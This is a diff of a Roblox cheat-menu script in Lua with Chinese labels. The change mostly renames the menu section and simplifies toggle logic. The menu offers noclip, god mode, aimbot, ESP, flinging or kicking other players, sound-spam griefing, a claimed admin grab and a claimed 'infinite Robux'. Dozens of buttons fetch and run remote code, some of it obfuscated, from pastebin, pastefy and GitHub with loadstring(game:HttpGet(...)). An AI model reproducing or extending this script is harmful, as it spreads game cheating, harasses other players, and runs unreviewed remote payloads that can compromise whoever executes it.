@@ -108,7 +108,6 @@ local rainbowGradient = nil
 
 local function setupRainbowText()
     wait(0.5)
-    
     if Window and Window.UIElements then
         local mainFrame = Window.UIElements.Main
         if mainFrame then
@@ -118,12 +117,10 @@ local function setupRainbowText()
                     table.insert(textLabels, descendant)
                 end
             end
-            
             for _, label in ipairs(textLabels) do
                 if label.Text and string.find(label.Text, "当前时间") then
                     local oldGradient = label:FindFirstChild("RainbowTextGradient")
                     if oldGradient then oldGradient:Destroy() end
-                    
                     rainbowGradient = Instance.new("UIGradient")
                     rainbowGradient.Name = "RainbowTextGradient"
                     rainbowGradient.Color = ColorSequence.new({
@@ -143,7 +140,6 @@ local function setupRainbowText()
             end
         end
     end
-    
     wait(1)
     setupRainbowText()
 end
@@ -160,7 +156,6 @@ RunService.Heartbeat:Connect(function()
         TimeTag:SetTitle("当前时间: " .. bjTime)
         lastUpdate = now
     end
-    
     if rainbowGradient and rainbowGradient.Parent then
         rainbowGradient.Rotation = (rainbowGradient.Rotation + 1.5) % 360
     end
@@ -236,7 +231,6 @@ about:Dropdown({
     Value = "WalkSpeed",
     Callback = function(Value)
         _G.MoveSpeed.Mode = Value
-        
         if _G.MoveSpeed.Enabled then
             _G.MoveSpeedFunctions.stop()
             _G.MoveSpeedFunctions.start()
@@ -284,32 +278,30 @@ about:Toggle({
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "隐身道具",
     Callback = function()
         loadstring(game:HttpGet("https://gist.githubusercontent.com/skid123skidlol/cd0d2dce51b3f20ad1aac941da06a1a1/raw/f58b98cce7d51e53ade94e7bb460e4f24fb7e0ff/%257BFE%257D%2520Invisible%2520Tool%2520(can%2520hold%2520tools)", true))()
     end
 })
 
-MainSection:Toggle({
+about:Toggle({
     Title = "循环恢复血量",
     Default = false,
     Callback = function(HF)
-        if HF then
-            local loopActive = true
-            spawn(function()
-                while loopActive do
+        _G.HealLoop = HF
+        spawn(function()
+            while _G.HealLoop do
+                pcall(function()
                     game.Players.LocalPlayer.Character.Humanoid.Health = 9e9
-                    task.wait(0.1)
-                end
-            end)
-        else
-            loopActive = false
-        end
+                end)
+                task.wait(0.1)
+            end
+        end)
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "锁定视野",
     Callback = function()
         loadstring(game:HttpGet("https://pastefy.app/nekmtvpA/raw"))()
@@ -328,7 +320,7 @@ local Cam2 = function()
     end
 end
 
-MainSection:Toggle({
+about:Toggle({
     Title = "解锁最大视野",
     Default = false,
     Callback = function(Value)
@@ -339,28 +331,28 @@ MainSection:Toggle({
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "查看游戏中的所有玩家（包括血量条）",
     Callback = function()
         loadstring(game:HttpGet(('https://pastebin.com/raw/G2zb992X'), true))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "工具包",
     Callback = function()
         loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/BTools.txt"))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "老外传送至玩家身边",
     Callback = function()
         loadstring(game:HttpGet('https://raw.githubusercontent.com/Infinity2346/Tect-Menu/main/Teleport%20Gui.lua'))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "点击传送道具",
     Callback = function()
         loadstring(game:HttpGet("https://pastefy.app/Jf2QXOwa/raw"))()
@@ -369,85 +361,76 @@ MainSection:Button({
 
 local Clipon = false
 local Stepped = nil
-MainSection:Toggle({
+about:Toggle({
     Title = "穿墙",
     Default = false,
     Callback = function(NC)
-        local Workspace = game:GetService("Workspace")
-        local Players = game:GetService("Players")
-        if NC then 
-            Clipon = true 
-        else 
-            Clipon = false 
-        end
+        Clipon = NC
+        if Stepped then Stepped:Disconnect() end
         Stepped = game:GetService("RunService").Stepped:Connect(function()
-            if not Clipon == false then
-                for a, b in pairs(Workspace:GetChildren()) do
-                    if b.Name == Players.LocalPlayer.Name then
-                        for i, v in pairs(Workspace[Players.LocalPlayer.Name]:GetChildren()) do
-                            if v:IsA("BasePart") then
-                                v.CanCollide = false
-                            end
-                        end
+            if not Clipon then return end
+            local char = game.Players.LocalPlayer.Character
+            if char then
+                for _, v in pairs(char:GetChildren()) do
+                    if v:IsA("BasePart") then
+                        v.CanCollide = false
                     end
                 end
-            else
-                Stepped:Disconnect()
             end
         end)
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "皮飞行",
     Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/07cdd3eeaf4d4928.txt_2024-08-09_090317.OTed.lua"))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "皮飞车",
     Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/Pi-feiche.lua"))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "皮自瞄",
     Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/3683e49998644fb7.txt_2024-08-09_094310.OTed.lua"))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "皮甩飞",
     Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/%E7%9A%AE%E7%94%A9%E9%A3%9E.lua"))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "甩飞所有人",
     Callback = function()
         loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "死亡笔记",
     Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/1_1.txt_2024-08-08_153358.OTed.lua"))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "铁拳",
     Callback = function()
         loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "电脑键盘",
     Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
@@ -455,15 +438,13 @@ MainSection:Button({
 })
 
 local AntiRagdoll = nil
-MainSection:Toggle({
+about:Toggle({
     Title = "防甩飞",
     Default = false,
     Callback = function(state)
         local player = game.Players.LocalPlayer
-        local runService = game:GetService("RunService")
-        
         if state then
-            AntiRagdoll = runService.Stepped:Connect(function()
+            AntiRagdoll = game:GetService("RunService").Stepped:Connect(function()
                 for _, otherPlayer in pairs(game.Players:GetPlayers()) do
                     if otherPlayer ~= player and otherPlayer.Character then
                         local char = otherPlayer.Character
@@ -500,113 +481,103 @@ MainSection:Toggle({
     end
 })
 
-MainSection:Toggle({
+about:Toggle({
     Title = "无法移动",
     Default = false,
     Callback = function(state)
         local player = game.Players.LocalPlayer
         local character = player.Character or player.CharacterAdded:Wait()
-        
-        if state then
-            for _, part in pairs(character:GetChildren()) do
-                if part:IsA("BasePart") then
-                    part.Anchored = true
-                end
-            end
-        else
-            for _, part in pairs(character:GetChildren()) do
-                if part:IsA("BasePart") then
-                    part.Anchored = false
-                end
+        for _, part in pairs(character:GetChildren()) do
+            if part:IsA("BasePart") then
+                part.Anchored = state
             end
         end
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "自杀",
     Callback = function()
         game.Players.LocalPlayer.Character.Humanoid.Health = 0
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "踏空行走",
     Callback = function()
         loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float'))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "通用ESP",
     Callback = function()
         loadstring(game:HttpGet('https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP'))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "踢人脚本(仅娱乐)",
     Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/c8320f69b6aa4f5d.txt_2024-08-08_214628.OTed.lua"))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "动画中心",
     Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Animation-Hub/main/Animation%20Gui", true))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "爬墙",
     Callback = function()
         loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "替身",
     Callback = function()
         loadstring(game:HttpGet(('https://raw.githubusercontent.com/SkrillexMe/SkrillexLoader/main/SkrillexLoadMain')))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "碰到就飞",
     Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "操人脚本",
     Callback = function()
         loadstring(game:HttpGet("https://pastefy.app/BkeffrT5/raw"))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "圈圈自瞄(可调)",
     Callback = function()
         loadstring(game:HttpGet("https://pastefy.app/YnfF3sje/raw"))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "iw指令",
     Callback = function()
         loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'), true))()
     end
 })
 
-MainSection:Toggle({
+about:Toggle({
     Title = "人物不可见状态(隐身)",
     Default = false,
     Callback = function(state)
         local player = game.Players.LocalPlayer
         local character = player.Character or player.CharacterAdded:Wait()
-        
         for _, part in pairs(character:GetChildren()) do
             if part:IsA("BasePart") then
                 part.Transparency = state and 1 or 0
@@ -619,12 +590,11 @@ MainSection:Toggle({
 })
 
 local getBackpackRunning = false
-MainSection:Toggle({
+about:Toggle({
     Title = "获取所有玩家背包道具",
     Default = false,
     Callback = function(state)
         getBackpackRunning = state
-        
         if state then
             task.spawn(function()
                 while getBackpackRunning do
@@ -647,7 +617,7 @@ MainSection:Toggle({
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "获取所有玩家道具",
     Callback = function()
         for i, v in pairs(game.Players:GetChildren()) do
@@ -659,28 +629,28 @@ MainSection:Button({
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "获取当前道具",
     Callback = function()
         loadstring(game:HttpGet("https://pastefy.app/3FU05Dyt/raw"))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "装备全部道具",
     Callback = function()
         loadstring(game:HttpGet("https://pastefy.app/uBqVR9JC/raw"))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "删除道具",
     Callback = function()
         loadstring(game:HttpGet("https://pastefy.app/r4LHK4p0/raw"))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "删除所有道具",
     Callback = function()
         loadstring(game:HttpGet("https://pastefy.app/8HB71Lbj/raw"))()
@@ -688,7 +658,7 @@ MainSection:Button({
 })
 
 local maxDistance = 10
-MainSection:Input({
+about:Input({
     Title = "互动距离",
     Value = "",
     PlaceholderText = "输入(默认10米)",
@@ -704,41 +674,37 @@ MainSection:Input({
 })
 
 local autoInteract = false
-MainSection:Toggle({
+about:Toggle({
     Title = "自动互动",
     Default = false,
     Callback = function(state)
-        if state then
-            autoInteract = true
-            while autoInteract do
-                local player = game.Players.LocalPlayer
-                local character = player.Character
-                if character and character:FindFirstChild("HumanoidRootPart") then
-                    local playerPosition = character.HumanoidRootPart.Position
-                    for _, descendant in pairs(workspace:GetDescendants()) do
-                        if descendant:IsA("ProximityPrompt") then
-                            local objectPosition = descendant.Parent and descendant.Parent:IsA("BasePart") and descendant.Parent.Position
-                            if objectPosition then
-                                local distance = (playerPosition - objectPosition).Magnitude
-                                if distance <= maxDistance then
-                                    fireproximityprompt(descendant)
-                                end
-                            else
+        autoInteract = state
+        while autoInteract do
+            local player = game.Players.LocalPlayer
+            local character = player.Character
+            if character and character:FindFirstChild("HumanoidRootPart") then
+                local playerPosition = character.HumanoidRootPart.Position
+                for _, descendant in pairs(workspace:GetDescendants()) do
+                    if descendant:IsA("ProximityPrompt") then
+                        local objectPosition = descendant.Parent and descendant.Parent:IsA("BasePart") and descendant.Parent.Position
+                        if objectPosition then
+                            local distance = (playerPosition - objectPosition).Magnitude
+                            if distance <= maxDistance then
                                 fireproximityprompt(descendant)
                             end
+                        else
+                            fireproximityprompt(descendant)
                         end
                     end
                 end
-                task.wait(0.25)
             end
-        else
-            autoInteract = false
+            task.wait(0.25)
         end
     end
 })
 
 local customHoldDuration = 0
-MainSection:Input({
+about:Input({
     Title = "互动时间",
     Value = "",
     PlaceholderText = "输入(默认0秒)",
@@ -754,7 +720,7 @@ MainSection:Input({
 })
 
 local promptConnection = nil
-MainSection:Toggle({
+about:Toggle({
     Title = "快速互动",
     Default = false,
     Callback = function(Value)
@@ -793,7 +759,7 @@ local function toggleXRay()
     end
 end
 
-MainSection:Toggle({
+about:Toggle({
     Title = "X-Ray",
     Default = false,
     Callback = function(Value)
@@ -805,7 +771,7 @@ MainSection:Toggle({
     end
 })
 
-MainSection:Toggle({
+about:Toggle({
     Title = "无限跳",
     Default = false,
     Callback = function(IJ)
@@ -818,7 +784,7 @@ MainSection:Toggle({
     end
 })
 
-MainSection:Toggle({
+about:Toggle({
     Title = "上帝模式",
     Default = false,
     Callback = function(Value)
@@ -833,14 +799,14 @@ MainSection:Toggle({
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "聊天气泡美化",
     Callback = function()
         loadstring(game:HttpGet("https://pastefy.app/lCEPuiQO/raw"))()
     end
 })
 
-MainSection:Toggle({
+about:Toggle({
     Title = "靠近敌人自动攻击[需要先装备武器]",
     Default = false,
     Callback = function(state)
@@ -958,15 +924,11 @@ MainSection:Toggle({
     end
 })
 
-MainSection:Toggle({
+about:Toggle({
     Title = "坐下",
     Default = false,
     Callback = function(Value)
-        if Value then
-            game.Players.LocalPlayer.Character.Humanoid.Sit = true
-        else
-            game.Players.LocalPlayer.Character.Humanoid.Sit = false
-        end
+        game.Players.LocalPlayer.Character.Humanoid.Sit = Value
     end
 })
 
@@ -976,13 +938,11 @@ local function spamSound()
         local sound = Instance.new('Sound')
         local sound_stop = sound.Play
         local get_descendants = game.GetDescendants
-        
         for i, v in next, get_descendants(game) do
             if class_check(v, "Sound") then
                 sound_stop(v)
             end
         end
-        
         get_descendants = nil
         sound:Remove()
         get_descendants = nil
@@ -991,19 +951,19 @@ local function spamSound()
     end
 end
 
-MainSection:Toggle({
+about:Toggle({
     Title = "声音折磨",
     Default = false,
     Callback = function(bool)
         _G.spamSoond = bool
         if bool then
-            spamSound()
+            spawn(spamSound)
         end
     end
 })
 
 local Break = false
-MainSection:Toggle({
+about:Toggle({
     Title = "七彩建筑",
     Default = false,
     Callback = function(Value)
@@ -1011,26 +971,25 @@ MainSection:Toggle({
             Break = false
             local BaseParts = {}
             local Mats = Enum.Material:GetEnumItems()
-            
             for i, v in pairs(game.Workspace:GetDescendants()) do
                 if v:IsA("BasePart") then
                     table.insert(BaseParts, v)
                 end
             end
-            
             game.Workspace.DescendantAdded:Connect(function(v)
                 if v:IsA("BasePart") then
                     table.insert(BaseParts, v)
                 end
             end)
-            
-            while task.wait(0.025) do
-                for i, v in pairs(BaseParts) do
-                    v.Material = Mats[math.random(1, #Mats)]
-                    v.Color = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
+            spawn(function()
+                while task.wait(0.025) do
                     if Break then break end
+                    for i, v in pairs(BaseParts) do
+                        v.Material = Mats[math.random(1, #Mats)]
+                        v.Color = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
+                    end
                 end
-            end
+            end)
         else
             Break = true
         end
@@ -1041,7 +1000,7 @@ local enabled = false
 local deathPos = nil
 local waitTime = 0
 
-MainSection:Input({
+about:Input({
     Title = "等待时间(秒)",
     Value = "",
     PlaceholderText = "输入(默认0秒)",
@@ -1051,7 +1010,7 @@ MainSection:Input({
     end
 })
 
-MainSection:Toggle({
+about:Toggle({
     Title = "原地复活",
     Default = false,
     Callback = function(state)
@@ -1067,7 +1026,7 @@ game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
             hrp.CFrame = CFrame.new(deathPos)
         end
     end
-})
+end)
 
 game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
     local humanoid = char:WaitForChild("Humanoid")
@@ -1076,16 +1035,16 @@ game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
             deathPos = char.HumanoidRootPart.Position
         end
     end)
-})
+end)
 
-MainSection:Button({
+about:Button({
     Title = "人物螺旋上天",
     Callback = function()
         loadstring(game:HttpGet("https://pastefy.app/xV1T3PAi/raw"))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "无限R币",
     Callback = function()
         loadstring(game:HttpGet("https://pastefy.app/SxhPVOyM/raw"))()
@@ -1096,18 +1055,16 @@ local originalChatVisible = nil
 local heartbeatConnection = nil
 local chatEnabled = false
 
-MainSection:Toggle({
+about:Toggle({
     Title = "显示聊天框",
     Default = false,
     Callback = function(state)
         chatEnabled = state
-        
         if state then
             if originalChatVisible == nil then
                 originalChatVisible = game:GetService("StarterGui"):GetCoreGuiEnabled(Enum.CoreGuiType.Chat)
             end
             game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
-            
             if heartbeatConnection then heartbeatConnection:Disconnect() end
             heartbeatConnection = game:GetService("RunService").Heartbeat:Connect(function()
                 game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
@@ -1126,21 +1083,21 @@ MainSection:Toggle({
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "获得管理员权限",
     Callback = function()
         loadstring(game:HttpGet("https://pastebin.com/raw/sZpgTVas"))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "显示时间",
     Callback = function()
         loadstring(game:HttpGet("https://pastebin.com/raw/RycMWV3a"))()
     end
 })
 
-MainSection:Button({
+about:Button({
     Title = "F3X",
     Callback = function()
         loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
@@ -1152,15 +1109,13 @@ local notifyEnabled = false
 local playerAddedConn = nil
 local playerRemovedConn = nil
 
-MainSection:Toggle({
+about:Toggle({
     Title = "玩家进出服务器通知",
     Default = false,
     Callback = function(state)
         notifyEnabled = state
-        
         if playerAddedConn then playerAddedConn:Disconnect() end
         if playerRemovedConn then playerRemovedConn:Disconnect() end
-        
         if state then
             playerAddedConn = game.Players.ChildAdded:Connect(function(player)
                 pcall(function()
@@ -1169,7 +1124,6 @@ MainSection:Toggle({
                     end
                 end)
             end)
-            
             playerRemovedConn = game.Players.ChildRemoved:Connect(function(player)
                 pcall(function()
                     if notifyEnabled then
